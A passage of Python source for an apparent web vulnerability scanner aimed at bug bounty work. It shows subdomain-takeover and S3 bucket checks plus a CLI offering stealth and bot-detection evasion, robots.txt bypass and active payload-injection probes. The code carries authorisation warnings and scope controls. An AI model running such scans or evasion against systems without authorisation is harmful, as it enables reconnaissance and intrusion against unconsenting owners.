    "ghost":             (["ghost.io"],                   ["The thing you were looking for is no longer here"],
                                                           False),
    "helpscout":         (["helpscoutdocs.com"],          ["No settings were found for this company"],
                                                           False),
    "zendesk":           (["zendesk.com"],                ["Help Center Closed", "Oops, this help center no longer exists"],
                                                           False),
    "uservoice":         (["uservoice.com"],              ["This UserVoice subdomain is currently available"],
                                                           False),
    "pingdom":           (["stats.pingdom.com"],          ["This public report page has not been activated"],
                                                           False),
    "statuspage":        (["statuspage.io"],              ["You are being redirected"],
                                                           False),
    "surge":             (["surge.sh"],                   ["project not found"],
                                                           False),
    "netlify":           (["netlify.app", "netlify.com"], ["Not Found - Request ID"],
                                                           False),
    "readme":            (["readme.io", "readmessl.com"], ["Project doesnt exist... yet!"],
                                                           False),
    "intercom":          (["custom.intercom.help"],       ["This page is reserved for artistic dogs"],
                                                           False),
    "webflow":           (["webflow.io"],                 ["The page you are looking for doesn't exist"],
                                                           False),
    "fly.io":            (["fly.dev"],                    ["404 Not Found"],
                                                           False),
    "pantheon":          (["pantheonsite.io"],            ["404 error unknown site", "The gods are wise, but do not know of any such site"],
                                                           False),
}

_takeover_checked = set()

# Warning included in every HIGH/CRITICAL takeover finding detail
_SDT_DO_NOT_CLAIM = (
    "DO NOT claim this resource — document and report only. "
    "Claiming the resource constitutes unauthorized access even if technically possible."
)


def _sdt_cname_is_dangling(cname_target: str) -> tuple:
    """
    Attempt to resolve the CNAME target itself for A records.
    Returns (is_dangling: bool, reason: str).

    NXDOMAIN or no A record → dangling.  Any other DNS failure is treated as
    "unknown" (False) so we don't suppress real findings due to transient errors.
    """
    try:
        answers = dns.resolver.resolve(cname_target, "A")
        ip = str(answers[0].address) if answers else "?"
        return False, f"{cname_target} resolves ({ip})"
    except dns.resolver.NXDOMAIN:
        return True, f"{cname_target} → NXDOMAIN"
    except dns.resolver.NoAnswer:
        return True, f"{cname_target} → no A record"
    except dns.exception.DNSException:
        return False, f"{cname_target} DNS lookup failed (unknown)"


def _sdt_claimability(fqdn: str, cname_target: str, service: str, body: str) -> tuple:
    """
    Run service-specific claimability verification after a body fingerprint match.

    Returns (confidence, detail_note) where confidence is one of:
      "SUPPRESS"          — finding should be suppressed (e.g. GitHub org exists)
      "CONFIRMED"         — resource is verifiably unclaimed
      "LIKELY"            — fingerprint matched, claimability probable but unverified
      "NEEDS VERIFICATION"— fingerprint matched, manual check required
    """
    if service == "github-pages":
        org = cname_target.split(".")[0]
        org_exists = False
        pages_404 = False
        try:
            r = _get_session().get(
                f"https://github.com/{org}",
                headers=create_request_header(),
                timeout=8,
                allow_redirects=True,
            )
            org_exists = (r.status_code == 200)
        except Exception:
            pass
        if org_exists:
            print(timestamp() + f" GitHub org '{org}' exists — suppressing Pages takeover FP for {fqdn}")
            return "SUPPRESS", f"GitHub org '{org}' exists — namespace protected"
        try:
            r = _get_session().get(
                f"https://{org}.github.io",
                headers=create_request_header(),
                timeout=8,
                allow_redirects=True,
            )
            pages_404 = (r.status_code == 404)
        except Exception:
            pass
        if not pages_404:
            print(timestamp() + f" {org}.github.io did not return 404 — suppressing Pages takeover FP for {fqdn}")
            return "SUPPRESS", f"{org}.github.io returned non-404 — namespace may be protected"
        return "CONFIRMED", (
            f"github.com/{org} → 404 (org does not exist); "
            f"{org}.github.io → 404 (Pages namespace unclaimed)"
        )

    elif service == "aws-s3":
        bucket_name = cname_target.split(".s3")[0] if ".s3" in cname_target else cname_target.split(".")[0]
        try:
            r = _get_session().request(
                "HEAD",
                f"https://{cname_target}",
                headers=create_request_header(),
                timeout=8,
                allow_redirects=False,
                verify=False,
            )
            if r.status_code in (404,) or "NoSuchBucket" in (r.text or ""):
                return "CONFIRMED", f"S3 bucket '{bucket_name}' confirmed unclaimed (NoSuchBucket / 404)"
            if r.status_code == 403:
                return "SUPPRESS", f"S3 bucket '{bucket_name}' exists but is private (403 AccessDenied)"
        except Exception:
            pass
        return "LIKELY", f"S3 bucket '{bucket_name}' — HEAD check inconclusive"

    elif service == "heroku":
        if "herokudns.com" in cname_target:
            app_name = cname_target.split(".herokudns")[0]
        elif "herokuapp.com" in cname_target:
            app_name = cname_target.split(".herokuapp")[0]
        else:
            app_name = cname_target.split(".")[0]
        try:
            r = _get_session().get(
                f"https://api.heroku.com/apps/{app_name}",
                headers={**create_request_header(),
                         "Accept": "application/vnd.heroku+json; version=3"},
                timeout=8,
                allow_redirects=False,
                verify=False,
            )
            if r.status_code == 404:
                return "CONFIRMED", f"Heroku app '{app_name}' confirmed available (API 404)"
            return "LIKELY", f"Heroku app '{app_name}' — API returned {r.status_code}"
        except Exception:
            return "LIKELY", f"Heroku app '{app_name}' — API check failed"

    elif service == "fastly":
        if "Fastly error: unknown domain" in body:
            return "CONFIRMED", "Fastly 'unknown domain' fingerprint confirmed (note: Fastly requires a paid account to claim)"
        return "LIKELY", "Fastly CNAME matched — body fingerprint partial"

    elif service == "zendesk":
        if any(fp in body for fp in ["Help Center Closed", "Help Center Unavailable",
                                      "Oops, this help center no longer exists"]):
            return "CONFIRMED", "Zendesk help center unavailable fingerprint confirmed"
        return "LIKELY", "Zendesk CNAME matched — body fingerprint partial"

    elif service == "shopify":
        if "Sorry, this shop is currently unavailable" in body:
            return "CONFIRMED", "Shopify 'shop unavailable' fingerprint confirmed"
        return "LIKELY", "Shopify CNAME matched — body fingerprint partial"

    elif service == "squarespace":
        if "No Such Account" in body:
            return "CONFIRMED", "Squarespace 'No Such Account' fingerprint confirmed"
        return "LIKELY", "Squarespace CNAME matched — body fingerprint partial"

    elif service == "pantheon":
        if "404 error unknown site" in body.lower() or "gods are wise" in body.lower():
            return "CONFIRMED", "Pantheon 'unknown site' fingerprint confirmed"
        return "LIKELY", "Pantheon CNAME matched — body fingerprint partial"

    elif service == "tumblr":
        if ("There's nothing here." in body
                or "Whatever you were looking for doesn't currently exist" in body):
            return "CONFIRMED", "Tumblr 'nothing here' fingerprint confirmed"
        return "LIKELY", "Tumblr CNAME matched — body fingerprint partial"

    elif service == "ghost":
        if "Domain not configured" in body or "The thing you were looking for is no longer here" in body:
            return "CONFIRMED", "Ghost 'domain not configured' fingerprint confirmed"
        return "LIKELY", "Ghost CNAME matched — body fingerprint partial"

    elif service == "azure-app":
        if "404 Web Site not found" in body or "This web app has been stopped" in body:
            return "CONFIRMED", "Azure 'Web Site not found' fingerprint confirmed"
        return "LIKELY", "Azure App Service CNAME matched — body fingerprint partial"

    else:
        return "LIKELY", f"Body fingerprint matched for {service} — manual claimability check required"


def check_subdomain_takeover(fqdn):
    """
    Check if a subdomain is vulnerable to takeover by:
    1. Resolving its CNAME chain
    2. Confirming the CNAME target is dangling (NXDOMAIN or no A record)
    3. Matching the CNAME target against known takeover-vulnerable services
    4. Fetching the subdomain and confirming an unclaimed/error body fingerprint
    5. Running service-specific claimability verification

    Confidence levels drive severity:
      CONFIRMED         → CRITICAL (resource verifiably unclaimed)
      LIKELY            → HIGH     (fingerprint matched, claimability probable)
      NEEDS VERIFICATION→ MEDIUM   (fingerprint matched, manual check required)

    All HIGH/CRITICAL findings include a DO NOT CLAIM warning.
    Deduplicates per subdomain.
    """
    if fqdn in _takeover_checked:
        return
    _takeover_checked.add(fqdn)

    try:
        # Resolve CNAME chain
        cname_target = None
        try:
            answers = dns.resolver.resolve(fqdn, "CNAME")
            cname_target = str(answers[0].target).rstrip(".").lower()
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.DNSException):
            return  # No CNAME — not vulnerable via this vector

        if not cname_target:
            return

        # Confirm whether the CNAME target itself is dangling
        is_dangling, dns_note = _sdt_cname_is_dangling(cname_target)

        # Match against takeover signatures
        for service, (cname_patterns, body_fingerprints, confirm_required) in TAKEOVER_SIGNATURES.items():
            if not any(p in cname_target for p in cname_patterns):
                continue

            # CNAME matches a vulnerable service — confirm with HTTP body
            resp = safe_get("https://" + fqdn, timeout=8)
            if not resp:
                resp = safe_get("http://" + fqdn, timeout=8)
            if not resp:
                if confirm_required:
                    alert(
                        "SUBDOMAIN TAKEOVER — VERIFY MANUALLY",
                        "MEDIUM",
                        fqdn,
                        f"CNAME → {cname_target} ({service}) — no HTTP response. "
                        f"DNS: {dns_note}. "
                        f"Verify whether {cname_target} is claimable (infrastructure service)."
                    )
                else:
                    alert(
                        "POTENTIAL SUBDOMAIN TAKEOVER",
                        "HIGH",
                        fqdn,
                        f"CNAME → {cname_target} ({service}) — no HTTP response (possibly unclaimed). "
                        f"DNS: {dns_note}. {_SDT_DO_NOT_CLAIM}"
                    )
                return

            body = resp.text or ""
            matched_fp = [fp for fp in body_fingerprints if fp.lower() in body.lower()]

            if matched_fp:
                confidence, claim_notes = _sdt_claimability(fqdn, cname_target, service, body)

                if confidence == "SUPPRESS":
                    return

                if confidence == "CONFIRMED":
                    sev        = "CRITICAL"
                    alert_type = "SUBDOMAIN TAKEOVER VULNERABLE"
                elif confidence == "LIKELY":
                    sev        = "HIGH"
                    alert_type = "SUBDOMAIN TAKEOVER — LIKELY VULNERABLE"
                else:
                    sev        = "MEDIUM"
                    alert_type = "SUBDOMAIN TAKEOVER — VERIFY MANUALLY"

                detail = (
                    f"CNAME → {cname_target} ({service}) — unclaimed. "
                    f"Body fingerprint: {matched_fp[0][:80]!r}. "
                    f"DNS: {dns_note}. "
                    f"Claimability: {confidence} — {claim_notes}. "
                    f"{_SDT_DO_NOT_CLAIM}"
                )
                alert(alert_type, sev, fqdn, detail)
                print(timestamp() + f" [!!] SUBDOMAIN TAKEOVER ({confidence}): {fqdn} → {cname_target} ({service})")

            else:
                # CNAME points to a known-vulnerable service but body fingerprint
                # didn't match — surface for manual verification.
                alert(
                    "SUBDOMAIN TAKEOVER — VERIFY MANUALLY",
                    "MEDIUM",
                    fqdn,
                    f"CNAME → {cname_target} ({service}) — body fingerprint unconfirmed. "
                    f"DNS: {dns_note}. "
                    f"Check if {cname_target} is claimable on {service}."
                )
                print(timestamp() + f" Takeover candidate (unconfirmed): {fqdn} → {cname_target} ({service})")

    except Exception as e:
        print_error(f"check_subdomain_takeover failed for {fqdn}: {e}")


# ─────────────────────────────────────────────
# S3 bucket exposure detection
# ─────────────────────────────────────────────

# Regex patterns to extract S3 bucket names and URLs from page source / JS
S3_URL_PATTERNS = [
    # https://bucketname.s3.amazonaws.com
    re.compile(r'https?://([a-z0-9][a-z0-9\-]{2,62})\.s3[.\-](?:[\w\-]+\.)?amazonaws\.com', re.I),
    # https://s3.amazonaws.com/bucketname
    re.compile(r'https?://s3[.\-](?:[\w\-]+\.)?amazonaws\.com/([a-z0-9][a-z0-9\-]{2,62})', re.I),
    # https://s3.amazonaws.com/bucketname/
    re.compile(r's3://([a-z0-9][a-z0-9\-]{2,62})', re.I),
]

_s3_checked = set()

def check_s3_bucket(bucket_name, source_url=""):
    """
    Probe a discovered S3 bucket for public read or write access.
    Alerts on:
      - Public read (ListBucket returns XML)  → CRITICAL
      - 403 Forbidden (bucket exists, private) → INFORMATIONAL (logged only)
      - Public write (PUT succeeds)           → CRITICAL
    """
    if bucket_name in _s3_checked:
        return
    _s3_checked.add(bucket_name)

    bucket_url = f"https://{bucket_name}.s3.amazonaws.com/"
    try:
        resp = safe_get(bucket_url, timeout=6)
        if not resp:
            return

        if resp.status_code == 200 and "ListBucketResult" in resp.text:
            # Publicly listable — extract key count for context
            key_count = resp.text.count("<Key>")
            alert(
                "S3 BUCKET PUBLIC READ — LISTABLE",
                "CRITICAL",
                bucket_name,
                f"{bucket_url} — bucket listing exposed ({key_count} keys visible). Source: {source_url}"
            )
            print(timestamp() + f" [!!] S3 bucket listable: {bucket_name} ({key_count} keys)")

        elif resp.status_code == 200:
            # Bucket exists and responds publicly but listing is not enabled
            alert(
                "S3 BUCKET PUBLICLY ACCESSIBLE",
                "HIGH",
                bucket_name,
                f"{bucket_url} — bucket is publicly readable (HTTP 200, no listing). Source: {source_url}"
            )
            print(timestamp() + f" [!!] S3 bucket public (no listing): {bucket_name}")

        elif resp.status_code == 403:
            # Bucket exists but is private — log quietly, no alert
            print(timestamp() + f" S3 bucket exists (private/403): {bucket_name}")

        elif resp.status_code == 404 and "NoSuchBucket" in resp.text:
            # Bucket doesn't exist
            pass

    except Exception as e:
        print_error(f"check_s3_bucket failed for {bucket_name}: {e}")

def extract_and_probe_s3_buckets(content, source_url):
    """
    Extract S3 bucket names from page HTML or JS content and probe each one.
    Called from the crawler and JS analyser.
    """
    if not content:
        return
    text = content if isinstance(content, str) else content.decode("utf-8", errors="ignore")
    found = set()
    for pattern in S3_URL_PATTERNS:
        for match in pattern.finditer(text):
            bucket = match.group(1).lower().strip()
            if bucket and bucket not in found:
                found.add(bucket)
                print(timestamp() + f" S3 bucket reference found: {bucket} (from {source_url})")
                check_s3_bucket(bucket, source_url=source_url)

_s3_permutation_checked = set()  # root domains already permutation-scanned

def probe_s3_permutations(root_domain):
    """
    Generate common S3 bucket name patterns derived from the root domain
    and probe each one for public access.

    Only the bare name (no TLD) is used — e.g. "example" from "example.com".
    Skips domains already scanned this session. Adds a short delay between
    probes to avoid AWS throttling.
    """
    if root_domain in _s3_permutation_checked:
        return
    _s3_permutation_checked.add(root_domain)

    # Strip TLD: "example.com" → "example", "sub.example.co.uk" → "example"
    parts = root_domain.rstrip(".").split(".")
    name = parts[-2] if len(parts) >= 2 else parts[0]
    name = name.lower()

    candidates = [
        name,
        f"{name}-assets",
        f"{name}-backup",
        f"{name}-prod",
        f"{name}-staging",
        f"{name}-dev",
        f"{name}-static",
        f"{name}-media",
        f"{name}-uploads",
        f"{name}-logs",
        f"{name}-data",
        f"{name}-files",
        f"assets-{name}",
        f"backup-{name}",
        f"static-{name}",
    ]

    print(timestamp() + f" S3 permutation scan: {len(candidates)} candidates for '{name}' ({root_domain})")
    for bucket in candidates:
        time.sleep(0.5)
        check_s3_bucket(bucket, source_url=f"permutation scan of {root_domain}")


# ─────────────────────────────────────────────
# Multi-domain scanning
# ─────────────────────────────────────────────

def _reset_per_domain_state() -> None:
    """
    Clear all module-level dedup sets and per-scan caches so that a fresh
    domain scan does not inherit state from the previous one.

    Called between domains in sequential multi-domain mode.  In parallel mode
    each worker process has its own memory space so this is not needed.
    """
    global _zone_transfer_checked, _tls_checked, _exposure_checked
    global _sensitive_checked, _admin_checked, _sec_headers_checked
    global _dangerous_method_checked, _smuggling_tested, _waf_checked
    global _waf_results, _well_known_checked, _host_header_checked
    global _mapbox_pk_seen, _source_map_checked, _defcred_checked
    global _actuator_checked, _tech_specific_checked, _graphql_checked
    global _redirect_tested, _redirect_domains, _mass_assign_tested
    global _api_version_tested, _ws_security_tested, _ws_stored
    global _traversal_tested, _traversal_domains, _jwt_seen, _jwt_domains
    global _ssti_tested, _ssti_domains, _crlf_tested, _crlf_domains
    global _xxe_tested, _pp_body_tested, _pp_query_tested, _pp_js_tested
    global _sqli_tested, _sqli_domains, _cmdi_tested, _cmdi_domains
    global _ldapi_tested, _ldapi_form_tested
    global _deserial_passive_seen, _deserial_active_tested
    global _price_tested, _jwt_tested, _hpp_tested, _wcp_tested, _probe_baseline, _entropy_seen
    global _timing_profiles, _endpoint_baselines, _endpoint_baseline_futures
    global _ssrf_flagged, _ssrf_candidates, _ssrf_tested
    global _idor_tested, _takeover_checked, _s3_checked, _s3_permutation_checked
    global _subdomain_enriched, _ct_queried, _cookie_seen, _js_analysis_threads
    _zone_transfer_checked  = set()
    _tls_checked            = set()
    _exposure_checked       = set()
    _sensitive_checked      = set()
    _admin_checked          = set()
    _sec_headers_checked    = set()
    _dangerous_method_checked = set()
    _smuggling_tested       = set()
    _waf_checked            = set()
    _waf_results            = {}
    _well_known_checked     = set()
    _host_header_checked    = set()
    _mapbox_pk_seen         = set()
    _source_map_checked     = set()
    _defcred_checked        = set()
    _actuator_checked       = set()
    _tech_specific_checked  = set()
    _graphql_checked        = set()
    _redirect_tested        = set()
    _redirect_domains       = set()
    _mass_assign_tested     = set()
    _api_version_tested     = set()
    _ws_security_tested     = set()
    _ws_stored              = set()
    _traversal_tested       = set()
    _traversal_domains      = set()
    _jwt_seen               = set()
    _jwt_domains            = set()
    _ssti_tested            = set()
    _ssti_domains           = set()
    _crlf_tested            = set()
    _crlf_domains           = set()
    _xxe_tested             = set()
    _pp_body_tested         = set()
    _pp_query_tested        = set()
    _pp_js_tested           = set()
    _sqli_tested            = set()
    _sqli_domains           = set()
    _cmdi_tested            = set()
    _cmdi_domains           = set()
    _ldapi_tested           = set()
    _ldapi_form_tested      = set()
    _deserial_passive_seen  = set()
    _deserial_active_tested = set()
    _price_tested           = set()
    _jwt_tested             = set()
    _hpp_tested             = set()
    _wcp_tested             = set()
    _probe_baseline         = {}
    _endpoint_baselines         = {}
    _endpoint_baseline_futures  = {}
    _entropy_seen           = set()
    _timing_profiles        = {}
    _ssrf_flagged           = set()
    _ssrf_candidates        = {}
    _ssrf_tested            = set()
    # Note: _ssrf_oob_client and _ssrf_oob_base_url are session-scoped and NOT reset
    _idor_tested            = set()
    _takeover_checked       = set()
    _s3_checked             = set()
    _s3_permutation_checked = set()
    _subdomain_enriched     = set()
    _ct_queried             = set()
    _cookie_seen            = {}
    _js_analysis_threads    = []
    # Clear stop event so subsequent scans in multi-domain mode are not blocked
    _stop_event.clear()
    # Function-attribute dedup set used by check_spf_dmarc
    if hasattr(check_spf_dmarc, "_checked"):
        check_spf_dmarc._checked = set()
    # DNS cache does not need clearing — TTL-based expiry handles staleness


def _query_domain_summary(domain: str) -> dict:
    """
    Query ScrapeDB for alert counts and page count for a completed domain scan.
    Returns {'critical': n, 'high': n, 'medium': n, 'low': n, 'pages': n}.
    """
    host = urlparse(domain).netloc or domain
    try:
        conn = sqlite3.connect("ScrapeDB", timeout=10)
        conn.row_factory = sqlite3.Row
        sev_rows = conn.execute(
            "SELECT severity, COUNT(*) as c FROM Alerts "
            "WHERE target LIKE ? GROUP BY severity",
            (f"%{host}%",),
        ).fetchall()
        page_count = conn.execute(
            "SELECT COUNT(*) as c FROM HTTPHistory WHERE url LIKE ?",
            (f"%{host}%",),
        ).fetchone()
        conn.close()
    except Exception:
        return {"critical": 0, "high": 0, "medium": 0, "low": 0, "pages": 0}

    counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "pages": 0}
    for r in sev_rows:
        k = r["severity"].lower() if r["severity"] else ""
        if k in counts:
            counts[k] = r["c"]
    counts["pages"] = page_count["c"] if page_count else 0
    return counts


def _domain_worker(domain: str, kwargs: dict) -> None:
    """
    Entry point for a multiprocessing.Process worker.
    Each worker gets its own copy of module state (fork), so no reset needed.
    Catches SystemExit from main_crawler so the process exits cleanly.
    """
    try:
        main_crawler(domain, **kwargs)
    except (SystemExit, KeyboardInterrupt):
        pass


def run_multi_domain(
    domains: list,
    same_domain_only: bool = False,
    ignore_robots: bool    = False,
    min_workers: int       = 1,
    max_workers: int       = 10,
    parallel: bool         = False,
) -> None:
    """
    Scan a list of domains, either sequentially or in parallel (≤3 concurrent).

    Sequential mode (default):
      Calls main_crawler() in-process for each domain, resetting all dedup
      state between runs.  Findings accumulate in the shared ScrapeDB.

    Parallel mode (--parallel):
      Spawns one multiprocessing.Process per domain, capped at 3 concurrent.
      Each child process has its own memory, so state isolation is automatic.
      SQLite write contention is minimal at ≤3 writers; each process uses its
      own connection.

    Prints progress [N/total] and a summary table when all scans complete.
    """
    import multiprocessing as _mp

    total  = len(domains)
    kwargs = dict(
        same_domain_only = same_domain_only,
        ignore_robots    = ignore_robots,
        min_workers      = min_workers,
        max_workers      = max_workers,
    )
    results = {}   # domain → {'elapsed': float, 'summary': dict}

    if parallel:
        _MAX_PARALLEL = 3
        active: list  = []   # list of (Process, domain, start_time)
        queued        = list(enumerate(domains, 1))   # [(idx, domain), ...]

        def _reap_finished():
            for p, d, t0 in list(active):
                if not p.is_alive():
                    p.join()
                    elapsed = time.time() - t0
                    results[d] = {"elapsed": elapsed,
                                  "summary": _query_domain_summary(d)}
                    active.remove((p, d, t0))

        while queued or active:
            _reap_finished()
            while queued and len(active) < _MAX_PARALLEL:
                idx, domain = queued.pop(0)
                print(f"\n[{idx}/{total}] Scanning {domain}  [parallel]")
                p  = _mp.Process(target=_domain_worker, args=(domain, kwargs),
                                 daemon=False)
                p.start()
                active.append((p, domain, time.time()))
            time.sleep(1)
        _reap_finished()

    else:
        for idx, domain in enumerate(domains, 1):
            print(f"\n{'='*60}")
            print(f"[{idx}/{total}] Scanning {domain}...")
            print(f"{'='*60}")
            t0 = time.time()
            try:
                main_crawler(domain, **kwargs)
            except SystemExit:
                pass   # main_crawler calls sys.exit(0) on clean finish
            except KeyboardInterrupt:
                print("\n[*] Interrupted during multi-domain scan.")
                _shutdown_playwright()
                break
            elapsed = time.time() - t0
            results[domain] = {"elapsed": elapsed,
                               "summary": _query_domain_summary(domain)}
            if idx < total:
                _reset_per_domain_state()

    # ── Summary table ──────────────────────────────────────────────────────
    print(f"\n{'='*60}")
    print("MULTI-DOMAIN SCAN SUMMARY")
    print(f"{'='*60}")
    col_w = max((len(d) for d in domains), default=20)
    hdr   = (f"{'Domain':<{col_w}}  {'Pages':>6}  "
             f"{'CRIT':>5}  {'HIGH':>5}  {'MED':>5}  {'LOW':>5}  {'Time':>8}")
    print(hdr)
    print("-" * len(hdr))
    for domain in domains:
        r = results.get(domain, {})
        s = r.get("summary", {})
        elapsed_s = r.get("elapsed", 0)
        mins, secs = divmod(int(elapsed_s), 60)
        time_str   = f"{mins}m{secs:02d}s"
        print(
            f"{domain:<{col_w}}  "
            f"{s.get('pages',0):>6}  "
            f"{s.get('critical',0):>5}  "
            f"{s.get('high',0):>5}  "
            f"{s.get('medium',0):>5}  "
            f"{s.get('low',0):>5}  "
            f"{time_str:>8}"
        )
    print(f"{'='*60}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NuScrape — web recon and vulnerability scanner")
    parser.add_argument("-D", "--Domain",              help="Start URL including http/https")
    parser.add_argument("--rate-min",  type=float,     default=1.0,  help="Min seconds between requests (default: 1.0)")
    parser.add_argument("--rate-max",  type=float,     default=3.0,  help="Max seconds between requests (default: 3.0)")
    parser.add_argument("--concurrency", type=int,     default=5,    help="Max concurrent requests (default: 5)")
    parser.add_argument("--same-domain-only", action="store_true",   help="Only crawl URLs on the starting domain")
    parser.add_argument("--resume",        action="store_true",  help="Resume from saved crawl state if available")
    parser.add_argument("--ignore-robots", action="store_true",  help="Ignore robots.txt restrictions")
    parser.add_argument("--playwright",    action="store_true",  help="Enable Playwright JS rendering for JS-heavy pages")
    parser.add_argument("--no-social",     action="store_true",  help="Skip crawling into social media domains (Facebook, Twitter, YouTube, etc.)")
    parser.add_argument("--no-skip-google-tracking", action="store_true",
                        help="Crawl Google tracking, Maps, and Fonts CDN URLs (default: skip them)")
    parser.add_argument("--stealth",        default="LOUD",       choices=["LOUD", "NORMAL", "GHOST"],
                        help="Stealth profile: LOUD (fast, default), NORMAL (moderate delays), GHOST (slow, randomised)")
    parser.add_argument("--bug-bounty-header", type=str, default=None,
                        help="Value for X-Bug-Bounty header e.g. 'HackerOne-chr0nic'. Omit to disable.")
    parser.add_argument("--active-probes", action="store_true",
                        help="Enable payload-injecting checks: path traversal, SSTI, CRLF injection, "
                             "CORS evil-origin probes, default credential tests, and dangerous HTTP method testing. "
                             "Only use against targets you are authorised to test.")
    parser.add_argument("--no-baseline", action="store_true",
                        help="Disable per-endpoint baseline profiling for faster scans. "
                             "Active probe anomaly gating is skipped; all probe responses are treated as anomalous.")
    parser.add_argument("--tutorial", action="store_true",
                        help="Append HOW TO VERIFY instructions to each finding for bug bounty / learning use.")
    parser.add_argument("--min-workers", type=int, default=1,
                        help="Minimum adaptive concurrency workers (default: 1)")
    parser.add_argument("--max-workers", type=int, default=10,
                        help="Maximum adaptive concurrency workers (default: 10)")
    parser.add_argument("--domains", metavar="FILE",
                        help="Path to a text file containing one target URL per line "
                             "(alternative to -D for multi-domain scanning)")
    parser.add_argument("--parallel", action="store_true",
                        help="Run up to 3 domain scans concurrently (requires --domains)")
    parser.add_argument("--scope", metavar="FILE",
                        help="Path to a HackerOne scope CSV file "
                             "(columns: asset_identifier, asset_type, instruction, max_severity). "
                             "In-scope assets expand crawl scope; excluded assets are skipped entirely.")

    args = parser.parse_args()

    if args.scope:
        HO_INCLUDE_PATTERNS, HO_EXCLUDE_PATTERNS = load_hackerone_scope(args.scope)

    STEALTH_PROFILE = args.stealth
    if STEALTH_PROFILE != "LOUD":
        print(f"[*] Stealth profile: {STEALTH_PROFILE}")

    BUG_BOUNTY_HEADER = args.bug_bounty_header
    if BUG_BOUNTY_HEADER:
        print(f"[*] Bug bounty header enabled: X-Bug-Bounty: {BUG_BOUNTY_HEADER}")

    ACTIVE_PROBES = args.active_probes
    if ACTIVE_PROBES:
        print("=" * 60)
        print("[!] WARNING: Active probes enabled.")
        print("[!] Payload-injecting checks are ON:")
        print("[!]   path traversal, SSTI, CRLF injection,")
        print("[!]   CORS evil-origin probes, default credential tests,")
        print("[!]   dangerous HTTP method testing (TRACE/PUT/DELETE/CONNECT)")
        print("[!] Only scan targets you are authorised to test.")
        print("=" * 60)

    if args.no_baseline:
        BASELINE_ENABLED = False
        print("[*] Baseline profiling disabled — active probe anomaly gating skipped")
    if args.tutorial:
        TUTORIAL_MODE = True
        print("[*] Tutorial mode enabled — HOW TO VERIFY guidance will be appended to findings")

    if args.rate_min:    RATE_LIMIT_MIN = args.rate_min
    if args.rate_max:    RATE_LIMIT_MAX = args.rate_max
    if args.concurrency: MAX_CONCURRENT = args.concurrency
    if args.no_social:
        SOCIAL_FILTER_FLAGS["enabled"] = True
        print("[*] Social media filter enabled — skipping Facebook, X, YouTube, LinkedIn, etc.")
    if args.no_skip_google_tracking:
        SKIP_GOOGLE_TRACKING = False
        print("[*] Google tracking/CDN filter disabled — Play Store, Maps, Fonts, and analytics URLs will be crawled")
    if args.playwright:
        PLAYWRIGHT_FLAGS["enabled"] = True
        if not PLAYWRIGHT_AVAILABLE:
            print("[!] Playwright not installed. Run: pip install playwright && playwright install chromium")
        else:
            print("[*] Playwright JS rendering enabled")
            if not PLAYWRIGHT_STEALTH_AVAILABLE:
                print("[!] playwright-stealth not installed — bot fingerprint suppression disabled. Run: pip install playwright-stealth")

    def _handle_stop_signal(signum, frame):
        print(f"\n[*] Received signal {signum} — shutting down cleanly...")
        _stop_event.set()
        _shutdown_playwright()
        # Give tracked threads up to 5 seconds to observe the stop event
        deadline = time.time() + 5.0
        with _js_analysis_threads_lock:
            threads = list(_js_analysis_threads)
        for _t in threads:
            remaining = deadline - time.time()
            if remaining > 0:
                _t.join(timeout=remaining)
        sys.exit(0)

    signal.signal(signal.SIGINT,  _handle_stop_signal)
    signal.signal(signal.SIGTERM, _handle_stop_signal)

    if args.domains:
        # ── Multi-domain mode ──────────────────────────────────────────────
        try:
            with open(args.domains, "r", encoding="utf-8") as _f:
                raw_lines = _f.readlines()
        except OSError as _e:
            print(f"[!] Cannot read domains file '{args.domains}': {_e}")
            sys.exit(1)

        domain_list = [
            ln.strip() for ln in raw_lines
            if ln.strip() and not ln.strip().startswith("#")
        ]
        if not domain_list:
            print(f"[!] No valid domains found in '{args.domains}'.")
            sys.exit(1)

        print(f"[*] Multi-domain mode: {len(domain_list)} target(s)"
              f"  parallel={args.parallel}")

        try:
            run_multi_domain(
                domain_list,
                same_domain_only = args.same_domain_only,
                ignore_robots    = args.ignore_robots,
                min_workers      = args.min_workers,
                max_workers      = args.max_workers,
                parallel         = args.parallel,
            )
        except KeyboardInterrupt:
            print("\n[*] Interrupted — shutting down cleanly...")
            _shutdown_playwright()
            sys.exit(0)

    elif args.Domain:
        try:
            main_crawler(args.Domain, same_domain_only=args.same_domain_only,
                         resume=args.resume, ignore_robots=args.ignore_robots,
                         min_workers=args.min_workers, max_workers=args.max_workers)
        except KeyboardInterrupt:
            print("\n[*] Interrupted — shutting down cleanly...")
            _shutdown_playwright()
            sys.exit(0)
    else:
        print("\nUsage: ./main.py -D https://www.example.com\n")
        print("Optional flags:")
        print("  --rate-min 1.0          Min seconds between requests")
        print("  --rate-max 3.0          Max seconds between requests")
        print("  --concurrency 5         Max concurrent async requests (legacy; use --max-workers)")
        print("  --min-workers 1         Minimum adaptive concurrency workers")
        print("  --max-workers 10        Maximum adaptive concurrency workers")
        print("  --same-domain-only      Stay on the starting domain only")
        print("  --resume                Resume from last saved state")
        print("  --playwright            Enable JS rendering via Playwright")
        print("  --no-social             Skip social media domains (Facebook, X, YouTube, etc.)")
        print("  --stealth LOUD|NORMAL|GHOST  Stealth profile (default: LOUD)")
        print("  --domains FILE          Scan multiple domains from a text file (one per line)")
        print("  --parallel              Run up to 3 domain scans concurrently (requires --domains)")
        print("  --scope FILE            HackerOne scope CSV — restricts crawl to in-scope assets,")
        print("                          skips excluded assets entirely")
        print("  --no-baseline           Disable per-endpoint baseline profiling (faster, less accurate)")
        print("  --tutorial              Append HOW TO VERIFY guidance to each finding\n")

